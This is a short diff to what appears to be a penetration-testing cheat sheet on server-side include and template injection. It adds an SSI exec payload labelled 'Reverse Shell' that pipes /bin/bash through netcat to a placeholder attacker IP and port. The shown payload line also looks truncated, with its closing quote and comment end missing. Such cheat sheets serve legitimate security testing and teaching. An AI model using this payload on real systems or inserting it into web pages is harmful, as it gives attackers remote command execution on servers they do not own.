@@ -84,6 +84,11 @@ Code: html
 // Print all variables
 <!--#printenv -->
 ```
+```
+Reverse Shell
+Code: html
+<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;
+```
 ### tplmap.py
 ### SSTI Exploitation Example 1
 ```
